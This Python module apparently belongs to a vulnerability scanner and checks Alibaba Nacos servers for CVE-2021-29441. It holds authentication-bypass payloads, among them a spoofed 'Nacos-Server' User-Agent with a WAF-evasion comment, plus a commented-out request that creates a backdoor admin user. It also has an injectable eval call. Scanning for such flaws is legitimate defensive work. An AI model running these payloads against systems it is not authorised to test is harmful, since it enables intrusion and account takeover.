#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    AlibabaNacos扫描类: 
        Nacos 未授权访问
            CVE-2021-29441(nacos-4593)
                https://github.com/alibaba/nacos/issues/4593
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.thread import thread
from lib.tool import head
from payloads.AlibabaNacos.cve_2021_29441 import cve_2021_29441_scan

class Nacos():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'AlibabaNacos'

        self.cve_2021_29441_payloads = [
            {
                'path': 'nacos/v1/auth/users?pageNo=1&pageSize=10',
                'data': '',
                'headers': head.merge(self.headers, {'User-Agent': 'Nacos-Server'})
            },
            {
                'path': 'v1/auth/users?pageNo=1&pageSize=10',
                'data': '',
                'headers': head.merge(self.headers, {'User-Agent': 'Nacos-Server'})
            },
            {
                'path': 'nacos/v1/auth/users?pageNo=1&pageSize=10',
                'data': '',
                'headers': head.merge(self.headers, {}) # * 有时候数据包带User-Agent: Nacos-Server头时, 会被WAF拦截, 所以为空
            },
            {
                'path': 'v1/auth/users?pageNo=1&pageSize=10',
                'data': '',
                'headers': head.merge(self.headers, {}) # * 有时候数据包带User-Agent: Nacos-Server头时, Payload会无效
            }
            # {    利用漏洞创建后台用户
            #     'path': '/nacos/v1/auth/users?username=mouse&password=mouse',
            #     'data': ''
            # }
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2021_29441_scan, url=url),
        ]

Nacos.cve_2021_29441_scan = cve_2021_29441_scan

nacos = Nacos()